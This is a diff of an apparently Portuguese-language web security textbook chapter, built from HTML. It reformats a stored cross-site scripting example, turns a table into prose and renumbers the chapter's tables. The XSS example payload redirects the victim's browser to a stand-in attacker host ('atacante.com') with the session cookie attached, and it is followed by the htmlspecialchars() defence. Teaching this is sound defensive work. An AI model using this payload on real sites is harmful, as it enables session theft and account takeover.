@@ -494,42 +494,14 @@ Tabela&nbsp;9.1: Os temas do capítulo e as categorias do OWASP Top 10:2025.
 <span id="cb6-2"><a href="#cb6-2"></a><span class="kw">echo</span> <span class="st">"&lt;p&gt;"</span> <span class="op">.</span> <span class="va">$_POST</span>[<span class="st">"comentario"</span>] <span class="op">.</span> <span class="st">"&lt;/p&gt;"</span><span class="ot">;</span></span></code><button title="Copiar para a área de transferência" class="code-copy-button"><i class="bi"></i></button></pre></div>
 <p>Um comentário normal, como <code>Muito bom!</code>, aparece tal como foi escrito. Um comentário com <code>&lt;b&gt;Muito bom!&lt;/b&gt;</code> aparece a negrito, porque o <em>browser</em> interpreta a etiqueta. E um comentário com um <code>&lt;script&gt;</code> não mostra nada, mas o código executa-se. O código inserido no texto tornou-se parte da página, e o <em>browser</em> não distingue o código do site do código inserido pelo visitante.</p>
 <p>O ataque desenrola-se em cinco passos. O atacante escreve um comentário malicioso, por exemplo:</p>
-<div class="sourceCode" id="cb7"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb7-1"><a href="#cb7-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span><span class="bu">document</span><span class="op">.</span><span class="at">location</span><span class="op">=</span><span class="st">'http://atacante.com/roubo?c='</span><span class="op">+</span><span class="bu">document</span><span class="op">.</span><span class="at">cookie</span><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span></code><button title="Copiar para a área de transferência" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<div class="sourceCode" id="cb7"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb7-1"><a href="#cb7-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb7-2"><a href="#cb7-2"></a>  <span class="bu">document</span><span class="op">.</span><span class="at">location</span><span class="op">=</span><span class="st">'http://atacante.com/roubo?c='</span><span class="op">+</span><span class="bu">document</span><span class="op">.</span><span class="at">cookie</span></span>
+<span id="cb7-3"><a href="#cb7-3"></a><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span></code><button title="Copiar para a área de transferência" class="code-copy-button"><i class="bi"></i></button></pre></div>
 <p>O site da Contraponto guarda-o e mostra-o. Quando um utilizador autenticado, como a Rita, gestora do site, abre a página, recebe-a com o <code>&lt;script&gt;</code> lá dentro, e o código executa-se no <em>browser</em> dela. O <em>script</em> envia o <em>cookie</em> de sessão deste site ao atacante, sem a Rita ver nada, e o atacante usa esse <em>cookie</em> para entrar no site como a Rita, com os privilégios dela (<a href="cap07.html#sec-07-sessoes" class="quarto-xref"><span>Secção 7.9.2</span></a>). Note-se que o <em>script</em> só lê os <em>cookies</em> do próprio site: os de outros sites, como o banco, ficam fora do alcance.</p>
 <p>A defesa é escapar sempre o texto vindo de utilizadores antes de o mostrar em HTML, com a função <code>htmlspecialchars()</code>. Esta função troca os carateres especiais do HTML (<code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code> e as aspas) por entidades inofensivas, e o <em>browser</em> mostra o texto em vez de o executar:</p>
 <div class="sourceCode" id="cb8"><pre class="sourceCode numberSource php number-lines code-with-copy"><code class="sourceCode php"><span id="cb8-1"><a href="#cb8-1"></a><span class="kw">&lt;?php</span></span>
 <span id="cb8-2"><a href="#cb8-2"></a><span class="kw">echo</span> <span class="st">"&lt;p&gt;"</span> <span class="op">.</span> <span class="fu">htmlspecialchars</span>(<span class="va">$_POST</span>[<span class="st">"comentario"</span>]) <span class="op">.</span> <span class="st">"&lt;/p&gt;"</span><span class="ot">;</span></span></code><button title="Copiar para a área de transferência" class="code-copy-button"><i class="bi"></i></button></pre></div>
-<div id="tbl-09-escape" class="quarto-float quarto-figure quarto-figure-center anchored">
-<figure class="quarto-float quarto-float-tbl figure">
-<figcaption class="quarto-float-caption-top quarto-float-caption quarto-float-tbl" id="tbl-09-escape-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
-Tabela&nbsp;9.2: O efeito de <code>htmlspecialchars()</code>.
-</figcaption>
-<div aria-describedby="tbl-09-escape-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
-<table class="caption-top table">
-<colgroup>
-<col style="width: 27%">
-<col style="width: 41%">
-<col style="width: 30%">
-</colgroup>
-<thead>
-<tr class="header">
-<th style="text-align: left;">O atacante escreve</th>
-<th style="text-align: left;">O HTML gerado</th>
-<th style="text-align: left;">O <em>browser</em> faz</th>
-</tr>
-</thead>
-<tbody>
-<tr class="odd">
-<td style="text-align: left;"><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
-<td style="text-align: left;"><code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</code></td>
-<td style="text-align: left;">mostra o texto, não o executa</td>
-</tr>
-</tbody>
-</table>
-</div>
-</figure>
-</div>
-<p>Desta forma, o texto do atacante é mostrado literalmente na página, como texto visível, e não interpretado como código. A regra é escapar sempre na saída: todo o texto vindo de utilizadores, antes de o mostrar em HTML.</p>
+<p>Por exemplo, o texto <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> passa a <code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</code>: o <em>browser</em> mostra o texto, não o executa. Desta forma, o texto do atacante é mostrado literalmente na página, como texto visível, e não interpretado como código. A regra é escapar sempre na saída: todo o texto vindo de utilizadores, antes de o mostrar em HTML.</p>
 </section>
 <section id="sec-09-csrf" class="level3" data-number="9.3.3">
 <h3 data-number="9.3.3" class="anchored" data-anchor-id="sec-09-csrf"><span class="header-section-number">9.3.3</span> CSRF (Cross-Site Request Forgery)</h3>
@@ -577,7 +549,7 @@ Tabela&nbsp;9.2: O efeito de <code>htmlspecialchars()</code>.
 <div id="tbl-09-texto-simples" class="quarto-float quarto-figure quarto-figure-center anchored">
 <figure class="quarto-float quarto-float-tbl figure">
 <figcaption class="quarto-float-caption-top quarto-float-caption quarto-float-tbl" id="tbl-09-texto-simples-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
-Tabela&nbsp;9.3: A tabela <code>utilizadores</code> com as palavras-passe em texto simples.
+Tabela&nbsp;9.2: A tabela <code>utilizadores</code> com as palavras-passe em texto simples.
 </figcaption>
 <div aria-describedby="tbl-09-texto-simples-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
 <table class="caption-top table">
@@ -712,7 +684,7 @@ $2y$12$JN664fXU3AqFVrjy2BYRruHKFpVmDZnHpk4rHlZTo5mSHGVvCrjnC</code></pre>
 <div id="tbl-09-contextos" class="quarto-float quarto-figure quarto-figure-center anchored">
 <figure class="quarto-float quarto-float-tbl figure">
 <figcaption class="quarto-float-caption-top quarto-float-caption quarto-float-tbl" id="tbl-09-contextos-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
-Tabela&nbsp;9.4: O escape consoante o contexto.
+Tabela&nbsp;9.3: O escape consoante o contexto.
 </figcaption>
 <div aria-describedby="tbl-09-contextos-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
 <table class="caption-top table">
@@ -762,7 +734,7 @@ Tabela&nbsp;9.4: O escape consoante o contexto.
 <div id="tbl-09-requisitos" class="quarto-float quarto-figure quarto-figure-center anchored">
 <figure class="quarto-float quarto-float-tbl figure">
 <figcaption class="quarto-float-caption-top quarto-float-caption quarto-float-tbl" id="tbl-09-requisitos-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
-Tabela&nbsp;9.5: Os requisitos da Rita.
+Tabela&nbsp;9.4: Os requisitos da Rita.
 </figcaption>
 <div aria-describedby="tbl-09-requisitos-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
 <table class="caption-top table">
@@ -894,7 +866,7 @@ Tabela&nbsp;9.5: Os requisitos da Rita.
 <div id="tbl-09-sintese" class="quarto-float quarto-figure quarto-figure-center anchored">
 <figure class="quarto-float quarto-float-tbl figure">
 <figcaption class="quarto-float-caption-top quarto-float-caption quarto-float-tbl" id="tbl-09-sintese-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
-Tabela&nbsp;9.6: Seis categorias, nove defesas.
+Tabela&nbsp;9.5: Seis categorias, nove defesas.
 </figcaption>
 <div aria-describedby="tbl-09-sintese-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
 <table class="caption-top table">
